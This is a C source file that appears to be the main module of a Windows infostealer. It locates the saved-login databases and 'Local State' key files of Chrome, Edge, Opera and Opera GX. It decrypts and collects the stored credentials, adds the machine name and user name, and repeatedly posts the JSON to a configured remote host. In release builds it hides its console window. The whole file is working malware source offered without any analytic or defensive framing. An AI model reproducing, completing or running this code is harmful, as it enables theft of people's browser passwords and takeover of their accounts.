#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <windows.h>

#include "chromium.h"
#include "credentials.h"
#include "connection.h"
#include "json/json.h"

#include CONFIG

static char* UserProfile;
static char* PathFormat = "%s\\%s\x00";
static char* dataFormat = "%d:%s:%s:%s\n\x00";

// No (backslash/slash) before path
char* pathFromUserProfile(const char* path) {
    char* result = malloc((strlen(UserProfile) + strlen(path) + 2) * sizeof *result);
    if(result == NULL) {
#ifdef DEBUG
        fprintf(stderr, "Memory Allocation Error!\n");
#endif
        return NULL;
    }
    sprintf(result, PathFormat, UserProfile, path);
    return result;
}

int main()
{
#ifdef RELEASE
    FreeConsole();
#endif

    UserProfile = getenv("USERPROFILE");

    int sent;
    ChromiumBrowser* browsers[] = {
        initChromium(pathFromUserProfile("AppData\\Local\\Google\\Chrome\\User Data\\Local State"),
                     pathFromUserProfile("AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"), 
                     "Chrome"),
        initChromium(pathFromUserProfile("AppData\\Roaming\\Opera Software\\Opera GX Stable\\Local State"),
                     pathFromUserProfile("AppData\\Roaming\\Opera Software\\Opera GX Stable\\Login Data"),
                     "OperaGX"),
        initChromium(pathFromUserProfile("AppData\\Local\\Microsoft\\Edge\\User Data\\Local State"),
                     pathFromUserProfile("AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data"), 
                     "Edge"),
        initChromium(pathFromUserProfile("AppData\\Roaming\\Opera Software\\Opera Stable\\Local State"),
                     pathFromUserProfile("AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data"),
                     "Opera"),
    };

    size_t browsersCount = sizeof(browsers)/sizeof(browsers[0]);

    HINTERNET hSession = InitSession();
    HINTERNET hConnect = Connect(hSession, HOSTNAME, PORT);

#ifdef DEBUG
    uint32_t credAmount;
#endif

    JsonNode* root = json_mkobject();
    JsonNode* pcname = json_mkstring(getenv("COMPUTERNAME"));
    JsonNode* username = json_mkstring(getenv("USERNAME"));
    json_append_member(root, "pcname", pcname);
    json_append_member(root, "username", username);

    JsonNode* list = json_mkarray();
    json_append_member(root, "data", list);

    for(register int j = 0; j < browsersCount; j++)
    {
        credList* Credentials = dumpChromium( browsers[j] );
        if(Credentials == NULL || Credentials->size == 0)
            continue;
        for(register int i = 0; i < Credentials->size; i++)
        {
            char* encoded = json_encode(root);
            if( strlen(encoded) >= 10000)
            {
                sent = -1;
                do
                    sent = Send(hConnect, PATH, encoded);
                while(sent != 0);
                json_delete(list);
                list = json_mkarray();
            }

            JsonNode* credNode = credentialToJson(Credentials->creds+i);
            json_append_element(list, credNode);
#ifdef DEBUG
            credAmount++;
#endif
            free(encoded);
        }

        deallocCreds(Credentials);
    }

#ifdef DEBUG
    fprintf(stderr, "\nCredentials Amount: %d\n", credAmount);
#endif

    BOOL hasChild = FALSE;
    JsonNode* child = NULL;
    json_foreach(child, list) {
        hasChild = TRUE;
        break;
    }

    if(hasChild)
    {
        sent = -1;
        do
            sent = Send(hConnect, PATH, json_encode(root));
        while(sent != 0);
    }

    for( register int i = 0; i < browsersCount; i++ )
    {
        free(browsers[i]->localState);
        free(browsers[i]->loginData);
        free(browsers[i]);
    }

    json_delete(root);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return 0;
}

